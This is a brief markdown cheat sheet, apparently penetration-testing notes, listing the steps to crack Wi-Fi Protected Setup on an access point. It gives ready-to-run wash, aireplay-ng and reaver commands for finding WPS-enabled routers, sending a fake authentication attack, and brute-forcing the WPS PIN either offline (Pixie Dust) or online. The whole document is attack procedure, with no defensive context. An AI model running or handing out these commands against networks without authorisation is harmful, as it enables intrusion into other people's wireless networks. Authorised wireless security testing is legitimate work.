# WPS (Wi-Fi Protected Setup)

- Identify AP with WPS enabled
    - `sudo wash -i <INTERFACE> -s`
- Send Fake Auth Attack
    - `sudo aireplay-ng -1 0 -e <AP NAME> -a <AP MAC> -h <YOUR_MAC> <INTERFACE>`
- Do offline brute force attack (pixie dust)
    - `sudo reaver -i wlan0 -b <AP MAC> -SNLAvv -c 1 -K`
    
    Or
    
- Do online brute force attack
    - `sudo reaver -i <INTERFACE> -b <AP MAC> -SNLAsvv -d 1 -r 5:3 -c <CHANNEL_NUMBER>`